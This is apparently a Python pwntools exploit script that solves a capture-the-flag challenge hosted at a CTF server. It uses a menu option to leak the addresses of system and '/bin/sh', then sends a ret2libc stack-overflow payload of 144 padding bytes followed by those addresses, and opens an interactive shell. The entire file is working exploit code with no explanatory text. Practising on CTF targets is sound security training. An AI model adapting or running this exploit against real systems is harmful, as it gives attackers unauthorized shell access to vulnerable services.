from pwn import *

r = remote('ctf.j0n9hyun.xyz', 3010)

send = lambda x : r.sendlineafter(">>> ", x)

send("2")  # Make Money
send("4")  # Hidden Menu
send("3")  # system
r.recvuntil(": ")
system = int(r.recvn(10), 16)
send("4")
r.recvuntil(": ")
binsh = int(r.recvn(10), 16)

log.info("system: "+hex(system))
log.info("binsh: "+hex(binsh))

payload = ''
payload += "A"*144
payload += p32(system)
payload += "BBBB"
payload += p32(binsh)

send("5")
r.sendlineafter("> ", payload)
r.interactive()
